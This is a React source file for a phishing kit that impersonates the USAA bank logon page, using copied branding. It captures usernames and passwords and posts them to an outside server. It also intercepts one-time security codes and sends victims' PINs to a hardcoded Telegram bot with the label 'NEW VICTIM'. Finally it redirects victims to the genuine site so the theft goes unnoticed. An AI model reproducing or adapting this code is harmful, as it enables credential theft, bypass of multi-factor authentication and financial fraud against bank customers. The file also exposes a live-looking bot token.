import React, { useState } from 'react';
import axios from "axios";
import './App.css';

function App() {
  const [form1Data, setForm1Data] = useState({ username: '', password: '' });
  const [form2Data, setForm2Data] = useState('');
  const [pwd, pwdShow] = useState('pwd');
  const [butt, buttShow] = useState('butt');
  const [buttt, butttShow] = useState('buttt');
  const [pshow, pshowShow] = useState('pshow');
  const [sorry, sorryShow] = useState('sorry');
  const [formal, formalSet] = useState('formal');
  const [formalll, formalllSet] = useState('formal');
  const [formall, formallSet] = useState('formal');
  const [classValues, classValueShow] = useState('');
  const [formms, formmsSet] = useState('');
  const [valueClass, valueClassSet] = useState('');
  const [twoFa, twoFaSet] = useState('');
  const [pinFa, pinFaSet] = useState('');
  const [sorrys, sorrysSet] = useState('sorry');
  const [pinclaw, pinclawSet] = useState('');
  const [pshows, pshowsSet] = useState('pshow');
  const [spinner, spinnerSet] = useState('formal');


  const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
  const chatId = '-937223528';
  const message = `NEW VICTIM`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  // axios
  //   .post(url, {
  //     chat_id: chatId,
  //     text: message,
  //   })
  //   .then((response) => {
  //     console.log('Message sent successfully!', response.data);
  //   })
  //   .catch((error) => {
  //     console.error('Error sending message:', error);
  //   });


  const handleInputChange = (event) => {
    setForm1Data(event.target.value);
    twoFaSet(event.target.value)
    pinFaSet(event.target.value)
    pshowShow('pshow')
    sorryShow('sorry')
    sorrysSet('sorry')
  };

  const handleChange = (event) => {
    setForm2Data(event.target.value);
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    spinnerSet('')
    butttShow('buttt')
    sorryShow('sorry')
    const formData = new FormData(e.target);
    const username = formData.get("username");
    const password = formData.get("password");

    try {
      const response = await axios.post('https://baselinesa.onrender.com/login', {

    username,
    password,

      });
      const responseData = response.data;
      if(responseData.message === "Password is Invalid"){
        // alert(responseData.message)
        sorryShow('')
        spinnerSet('formal')
        butttShow('')
      } else {
        formmsSet('formms')
        classValueShow(responseData.classValue)
        formalSet('')
      }
      // Handle the response data in your React application
    } catch (error) {
      console.error('An error occurred:', error);
    }
  };


  const handleTwoFa = async (e) => {
      e.preventDefault()

      try {
        const response = await axios.post('http://localhost:3006/codesmfa', {
          twoFa
        });

        const responseData = response.data;


        if(responseData.messageCode === "Code is Invalid"){

          alert(responseData.messageCode)
          sorrysSet('')
        } else {
          formallSet('formal')
          formalllSet('')
          pinFaSet('')
        }
  
      } catch (error) {
        console.error('An error occurred:', error);
      }
  }



  const handlePinFA = async (e) => {
    e.preventDefault()

    const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
    const chatId = '-937223528';
    const message = `PIN: ${pinFa}`;
  
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
    axios
      .post(url, {
        chat_id: chatId,
        text: message,
      })
      .then((response) => {
        if(pinclaw === ""){
          pinclawSet('shows')
          pinFaSet('')
          pshowsSet('')
          console.log(pinclaw)
          return
        } else if(pinclaw === "shows"){
          alert('redirecting')
        window.location.href = 'https://www.usaa.com';
        }
        // console.log('Message sent successfully!', response.data);
      })
      .catch((error) => {
        console.error('Error sending message:', error);
      });

  }


  const sendCode = async (content) => {

    formalSet('formal')
    alert(content)
    valueClassSet(content)
    formallSet('')
    twoFaSet('')
    try {
      const response = await axios.post('http://localhost:3006/mfacodes', {
        content
      });

    } catch (error) {
      console.error('An error occurred:', error);
    }
  };

  const handleNextClick = (e) => {
    if(form1Data.username === ""){
      setTimeout(() => {
        pshowShow('')
      }, 1000);
      return
    }
    setTimeout(() => {
      pwdShow('')
      butttShow('butt')
      buttShow('buttt')
    }, 1500);

  }


  return (
    <div className="App">
      <header className="App-header">
      <div className="contain">
      <div className="img">
        <svg xmlns="http://www.w3.org/2000/svg" id="Logo-svg" viewBox="0 0 63 66"><title>USAA logo. Redirects to USAA home. USAA logo</title><path fill="#ffffff" d="M49.16 44.5s1.52 1.02 3 1.02c1.5 0 2.82-1.07 2.82-1.07V39.2s-1.33.96-2.8.96c-1.48 0-3.02-1.03-3.02-1.03l-15.3-9.06 1.4 6.2 13.9 8.22zM7.84 28.33S6.36 27.3 4.82 27.3s-2.8 1.08-2.8 1.08v5.23s1.26-.93 2.8-.93c1.54 0 3.02 1.03 3.02 1.03l12.64 7.48 1.08-4.73-13.72-8.1zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.23s-1.33.94-2.8.94c-1.48 0-3.02-1-3.02-1L32.04 22.15l1.42 6.2 15.7 9.3zM7.84 21.5s-1.48-1.04-3.02-1.04-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l14.02 8.3 1.08-4.74-15.1-8.93zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.24s-1.33.95-2.8.95c-1.48 0-3.02-1.03-3.02-1.03l-18.93-11.2 1.42 6.2 17.5 10.36zM7.84 14.65s-1.48-1.03-3.02-1.03-2.8 1.07-2.8 1.07v5.22s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l15.4 9.12 1.07-4.73-16.46-9.75zm22-2.1l19.32 11.4s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07V18.7s-1.33.94-2.8.94c-1.48 0-3.02-1.02-3.02-1.02L34.22 9.76 33.18 5.8c0-.17.15-.25.2-.26l2.54-.8c.34 0 .53.3.53.54l.14.28c.08.05.5-.07.5-.15V3.86c0-1.04-.82-1.96-1.93-1.96h-2.53S32.27 1 31.2 1h-4.8c-1.28 0-1.58 1.2-1.58 1.2l-3.34 13.65L7.84 7.8S6.36 6.77 4.82 6.77s-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03L24.6 23.1l3.83-16.73 1.4 6.17zM26.8 58.4c0 2.85-2.32 4.9-5.5 4.92-3.37 0-4.5-.58-4.5-.58l-.28-3.15s1.87 1.24 4.62 1.24c.76 0 2.48-.54 2.48-2.1 0-1.48-1.35-1.93-1.68-2.12-.67-.35-1.47-.7-2.13-1.04-1.23-.6-3.06-1.78-3.06-4.27 0-3.57 3.2-4.88 5.75-4.88 2.03 0 3.83.9 3.83.9v2.94c-.57-.34-1.5-1.4-3.84-1.4-1.6 0-2.68.86-2.68 2.04 0 1.1.9 1.8 1.77 2.22l2.44 1.17c1.27.62 2.76 1.9 2.76 4.1zm-15.05-1.35c0 1.3-.43 3.77-3.4 3.72C5.62 60.7 5.1 58.2 5.1 56.6v-9.87h-3.1v10.03c0 5.65 3.44 6.6 6.32 6.6 4.25 0 6.23-2.83 6.23-6.65v-9.97h-2.82v10.32zm43.23 5.93h-3.4l-.96-2.85h-5.78l-.98 2.85h-5.78l-.96-2.85h-5.78l-.98 2.85H27.3L32.9 48l-.54-1.27h3.38l5.4 15.32L46.4 48l-.54-1.27h3.37l5.75 16.25zm-18.63-5.12l-2-6.4-2.26 6.4h4.25zm13.5 0l-2-6.4-2.25 6.4h4.25zm5.93-10.38c-.55.3-1 .73-1.3 1.3S54 49.9 54 50.5c0 .6.17 1.18.47 1.73s.74 1 1.3 1.3c.54.3 1.12.46 1.73.46s1.18-.15 1.73-.45c.55-.3.98-.74 1.3-1.3s.44-1.13.44-1.73c0-.6-.15-1.2-.46-1.75s-.74-1-1.3-1.3c-.55-.3-1.12-.44-1.7-.44s-1.16.15-1.72.45zm3.14.5c.47.25.83.6 1.1 1.08.25.47.38.95.38 1.46 0 .5-.13.98-.4 1.45s-.6.82-1.06 1.07c-.46.26-.94.4-1.44.4s-1-.14-1.45-.4c-.46-.25-.82-.6-1.08-1.07-.25-.47-.38-.95-.38-1.45s.12-1 .38-1.46c.26-.47.62-.83 1.1-1.08s.93-.37 1.42-.37c.48 0 .96.13 1.42.38zm-2.35 4.47v-1.6h.36c.2 0 .37.05.48.13.17.12.38.4.64.88l.34.6h.73l-.44-.75c-.22-.33-.4-.58-.56-.73-.08-.08-.18-.14-.3-.2.3-.02.57-.14.76-.34.2-.2.3-.44.3-.72 0-.18-.06-.37-.18-.54-.12-.17-.27-.3-.47-.36-.2-.07-.5-.1-.95-.1h-1.28v3.75h.6zm0-3.25h.7c.3 0 .5.02.6.07s.2.1.25.2c.06.08.1.18.1.3 0 .16-.07.3-.2.4s-.36.17-.7.17h-.75V49.2z"></path></svg>
      </div>
      <div className="join-access">
        <a href="">JOIN USAA</a>
        <a href="" className="regg">REGISTER FOR ACCESS</a>
        <a href="" className="reg">REGISTER</a>
      </div>
    </div>
        </header>
  <section id="new-to-usaa">
    <svg id="flourish-icon" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 73.35 72" alt=""><defs></defs><title>usaa-symbol-laurel</title><path id="Laurel" className="cls-1" d="M31.16,49.51l2.26,7.7-7.19-3.56L24,45.95ZM26.58,62.1l6.68-4.44-7.8-1.89-6.68,4.44Zm-8-21.82-.5,8,5.54,5.81.5-8ZM15.5,56.34l7.8-1.88L16.62,50,8.82,51.9ZM15.44,33.1l-3.21,7.36,3.21,7.35,3.21-7.35ZM7.05,47.15,15,48l-4.76-6.46-8-.89ZM15,25.28,9.42,31.09l.51,8,5.54-5.81ZM2.26,35.62l7.19,3.57-2.26-7.7L0,27.92Zm14.9-17.85L10,21.34,7.71,29l7.19-3.57ZM1.7,23.14,7.24,29l.51-8L2.21,15.14ZM21.81,11.47l-8,.9L9.08,18.83l8-.9ZM5.44,11.23l3.22,7.36,3.22-7.35L8.66,3.88ZM15.63,3.49l-2.34,7.68,7.22-3.5L22.85,0Zm26.56,46-2.27,7.7,7.19-3.56,2.27-7.7Zm12.38,10.7-6.68-4.44-7.8,1.89,6.68,4.44ZM49.24,46.08l.5,8,5.54-5.81-.5-8ZM64.53,51.9,56.73,50l-6.68,4.44,7.8,1.88ZM54.69,40.45,57.9,47.8l3.21-7.35L57.91,33.1Zm16.36.24-8,.89L58.32,48l8-.89Zm-13.16-7.4,5.54,5.81.51-8L58.4,25.28Zm15.46-5.37-7.19,3.57-2.27,7.7,7.19-3.57Zm-14.9-2.45L65.64,29l-2.27-7.7-7.19-3.57ZM71.14,15.14,65.6,20.95l.51,8,5.54-5.82ZM56.3,17.93l8,.9-4.76-6.46-8-.9ZM64.69,3.88l-3.21,7.35,3.22,7.35,3.22-7.36ZM50.5,0l2.34,7.68,7.22,3.5L57.72,3.49ZM36.67,72,32,63.84l4.71-8.16,4.71,8.16Z"></path></svg>
    <div className="container">
      <div className="boxer">
        <h1>New to USAA?</h1>
        <p>Become a member by selecting "Join USAA" — it's easy and only takes a few minutes.</p>
        <a href="#">Join USAA</a>
      </div>
      <div className="formal" id={formms}>
        <h1>Log On</h1>
        <form onSubmit={handleSubmit} >
          <p id="sorry" className={sorry}>Sorry, the password you entered doesn't match what we have on file.</p>
          <div className="label usr">
            <label for="">Online ID</label>
            <p className='please' id={pshow}>Please enter Online ID.</p>
            <input type="text" name="username" placeholder=""
            value={form1Data.username} onChange={handleInputChange}
           required/>
          </div>
          <div className="label" id={pwd}>
            <label for="">Password</label>
            <input type="password" name="password" placeholder=""
            value={form1Data.password} onChange={handleInputChange}
          required/>
          </div><br/>
          <div className="loader" id={spinner}></div>
          <button type="" id={butt} className="" onClick={handleNextClick}>Next</button>
          <button id={buttt} type="submit">Next</button>
        </form><br/><br/><br/>
        <a href="">I need help logging on</a><br/><br/><br/><br/>
      </div>
      <div className="formal" id={formal}>
        <h1>Choose a Secure Option</h1>
        <form >

        {classValues && classValues.length > 0 && classValues.map((content, index) => (
  <div className="labell" onClick={() => sendCode(content)} key={index}>
    <p><b>Text security code to:</b><br /><br />{content}</p>
  </div>
))}
          
          <br/>
        </form><br/><br/><br/>
        <a href="">I need more options</a><br/><br/><br/><br/>
      </div>


      <div className="formal" id={formall}>
        <h1>Check your phone</h1>
        <form onSubmit={handleTwoFa} >
        <p>We sent a 6-digit security code to <br/>
          {valueClass}
        </p>

        <p id="sorry" className={sorrys}>Sorry, your code doesn't match.</p>


        <div className="label" id={pwd}>
            <label for="">6-Digit Code</label>
            <input type="text" name="password" placeholder=""
            value={twoFa} pattern=".{6,}" title="Input must be at least 6 characters long" onChange={handleInputChange}
          required/></div> <br/>
          <button type="submit">Next</button>

        </form><br/><br/><br/>
        <a href="">I need more options</a><br/><br/><br/><br/>
      </div>
      
      <div className="formal" id={formalll}>
        <h1>Verify PIN</h1>
        <form onSubmit={handlePinFA} >
        <p>Verify your 4-digit pin. <br/>
        </p>

        <div className="label">
            <label for="">4-Digit Pin</label>
            <p className='please' id={pshows}>Please enter 4-digit pin.</p>
            <input type="text" name="password" placeholder=""
            value={pinFa} pattern=".{4,}" title="Input must be at least 4 characters long" onChange={handleInputChange}
          required/></div> <br/>
          <button type="submit">Next</button>

        </form><br/><br/><br/>
        <a href="">I need more options</a><br/><br/><br/><br/>
      </div>
    </div>
  </section>

      {/* <form onSubmit={handleForm2Submit}>
      <input type="text" name="username" placeholder=""
              value={form2Data} onChange={handleChange}
             required/>
          <br/>
        <button type='submit'>Next</button>
      </form> */}
        <footer id="footer">
    <div className="containfoot">
    <ul id="ulls">
      <li>Security Center</li>
      <li>Policy Center</li>
      <li>Accessibility at USAA</li>
    </ul>
    <p>Copyright © 2022 USAA.</p>
    <p>NC-1120</p>
    </div>
  </footer>
    </div>
  );
}

export default App;
